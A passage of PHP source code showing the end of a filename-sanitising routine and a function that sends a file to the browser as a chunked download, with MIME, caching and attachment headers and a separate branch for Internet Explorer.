    $f = preg_replace(array('/[\&]/', '/[\@]/', '/[\#]/'), array('-and-', '-at-', '-number-'), $f);
    $f = preg_replace('/[^(\x20-\x7F)]*/','', $f); // removes any special chars we missed
    $f = str_replace(' ', '-', $f); // convert space to hyphen
    $f = str_replace('\'', '', $f); // removes apostrophes
    $f = preg_replace('/[^\w\-\.]+/', '', $f); // remove non-word chars (leaving hyphens and periods)
    $f = preg_replace('/[\-]+/', '-', $f); // converts groups of hyphens into one
    return strtolower($f);
  }
  
  function bmgDownloadFile($filename='',$filepath='')
  {

    if ($filename == '' OR $filepath == '')
    {
        return FALSE;
    }

    // Try to determine if the filename includes a file extension.
    // We need it in order to set the MIME type
    if (FALSE === strpos($filename, '.'))
    {
        return FALSE;
    }

    // Grab the file extension
    $x = explode('.', $filename);
    $extension = end($x);

    /******/
    
    
		$mime = bmgGetMime($filename);

		
    // Generate the server headers
    if (strpos($_SERVER['HTTP_USER_AGENT'], "MSIE") !== FALSE)
    {
        header('Content-Type: "'.$mime.'"');
        header('Content-Disposition: attachment; filename="'.$filename.'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header("Content-Transfer-Encoding: binary");
        header('Pragma: public');
        header("Content-Length: ".filesize($filepath));
    }
    else
    {

        header('Content-Description: File Transfer'); 
        header('Content-Type: "'.$mime.'"');
        header('Content-Disposition: attachment; filename="'.$filename.'"');
        header("Content-Transfer-Encoding: binary");
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: no-cache');
        header("Content-Length: ".filesize($filepath));
    }
    

		header('Set-Cookie: fileDownload=true; path=/');

    /*******************/
    
    $chunksize = 1 * (1024 * 1024);
		$buffer = '';
		$cnt = 0;
		
		$handle = fopen($filepath, 'r');
		if ($handle === FALSE)
		{
		 	return FALSE;
		}
		
		while (!feof($handle))
		{
		 	$buffer = fread($handle, $chunksize);
		 	echo $buffer;
		 	ob_flush();
		 	flush();
		
		 	$cnt += strlen($buffer);
		 	
		}
		
		fclose($handle);
		
		
    die;
   
  }
